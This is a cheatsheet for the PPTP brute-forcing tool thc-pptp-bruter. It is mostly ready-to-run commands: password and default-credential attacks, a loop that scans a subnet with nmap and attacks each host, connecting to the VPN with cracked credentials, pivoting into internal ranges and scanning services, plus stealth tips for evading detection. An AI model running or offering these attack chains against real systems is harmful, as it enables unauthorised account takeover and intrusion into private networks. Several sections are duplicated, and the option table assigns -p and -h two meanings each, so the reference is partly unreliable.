# THC-PPTP-Bruter Cheatsheet

## Quick Reference

### Basic PPTP Brute Force

```bash
# Single user, password list
thc-pptp-bruter -h 192.168.1.100 -u administrator -P /usr/share/wordlists/rockyou.txt

# User list, password list
thc-pptp-bruter -h 192.168.1.100 -U usernames.txt -P passwords.txt

# Custom port
thc-pptp-bruter -h 192.168.1.100 -p 17230 -u administrator -P passwords.txt
```

### Domain Authentication

```bash
# Single user, password list
thc-pptp-bruter -h 192.168.1.100 -u administrator -P passwords.txt -d CORP

# User list, password list
thc-pptp-bruter -h 192.168.1.100 -U usernames.txt -P passwords.txt -d CORP
```

### Multiple Threads

```bash
thc-pptp-bruter -h 192.168.1.100 -U usernames.txt -P passwords.txt -t 10
```

### Output to File

```bash
thc-pptp-bruter -h 192.168.1.100 -U usernames.txt -P passwords.txt -o results.txt
```

### Verbose Output

```bash
thc-pptp-bruter -h 192.168.1.100 -U usernames.txt -P passwords.txt -v
```

### Discovery and Attack

```bash
# 1. Find PPTP servers
nmap -p 1723 --open 192.168.1.0/24 -oG - > pptp_hosts.txt

# 2. Extract targets
grep "1723/open" pptp_hosts.txt | awk '{print $2}' > targets.txt

# 3. Brute force
for host in $(cat targets.txt); do
    thc-pptp-bruter -h $host -U usernames.txt -P passwords.txt
done
```

### Default Credentials

```bash
# Common PPTP default credentials
echo "admin:" > default_creds.txt
echo "admin:admin" >> default_creds.txt
echo "admin:password" >> default_creds.txt
echo "admin:Password1" >> default_creds.txt
echo "administrator:" >> default_creds.txt
echo "administrator:admin" >> default_creds.txt
echo "administrator:password" >> default_creds.txt

thc-pptp-bruter -h 192.168.1.100 -U default_users.txt -P default_creds.txt
```

### VPN Connection

```bash
# After finding credentials
pptpsetup --create vpn_tunnel --server 192.168.1.100 --username administrator --password password123 --donotrout
pppd call vpn_tunnel

# Verify connection
ifconfig ppp0
```

### Network Pivoting

```bash
# After VPN connection
route add -net 10.0.0.0/8 dev ppp0
nmap -p 22,80,445,3306,3389 10.0.0.0/24
```

## Command Options

| Option | Description |
|--------|-------------|
| `-h HOST` | Target VPN server hostname or IP |
| `-p PORT` | Target port (default: 1723) |
| `-u USERNAME` | Single username |
| `-U FILE` | Username list file |
| `-p PASSWORD` | Single password |
| `-P FILE` | Password list file |
| `-d DOMAIN` | Windows domain name |
| `-t THREADS` | Number of threads (default: 1) |
| `-o OUTPUT` | Output file |
| `-v` | Verbose output |
| `-q` | Quiet mode |
| `-h` | Show help |

## Common Workflows

### Discover and Attack

```bash
# 1. Find PPTP servers
nmap -p 1723 --open 192.168.1.0/24 -oA nmap_pptp

# 2. Extract targets
grep "1723/open" nmap_pptp.gnmap | awk '{print $2}' > pptp_targets.txt

# 3. Brute force
for host in $(cat pptp_targets.txt); do
    thc-pptp-bruter -h $host -U usernames.txt -P passwords.txt
done
```

### VPN Connection

```bash
# After finding credentials
pptpsetup --create vpn_tunnel --server 192.168.1.100 --username administrator --password password123 --donotrout
pppd call vpn_tunnel

# Verify connection
ifconfig ppp0
```

### Network Pivoting

```bash
# After VPN connection
route add -net 10.0.0.0/8 dev ppp0
nmap -p 22,80,445,3306,3389 10.0.0.0/24
```

## Troubleshooting

### Common Errors

**"Connection refused"**:
```bash
nmap -p 1723 192.168.1.100
telnet 192.168.1.100 1723
```

**"Authentication failed"**:
```bash
thc-pptp-bruter -h 192.168.1.100 -u administrator -P passwords.txt -v
thc-pptp-bruter -h 192.168.1.100 -u administrator -P passwords.txt -d CORP
```

**"Timeout"**:
```bash
thc-pptp-bruter -h 192.168.1.100 -U usernames.txt -P passwords.txt -t 1
```

## OpSec Tips

1. **Reduce threads**: Use `-t 1` for stealth
2. **Add delay**: Use `sleep 1` between attempts
3. **Log everything**: Use `-o` for audit trail
4. **Use default credentials**: Test common PPTP defaults

## Resources

- **GitHub**: https://github.com/galkan/thc-pptp-bruter
- **Kali Docs**: https://www.kali.org/tools/thc-pptp-bruter/
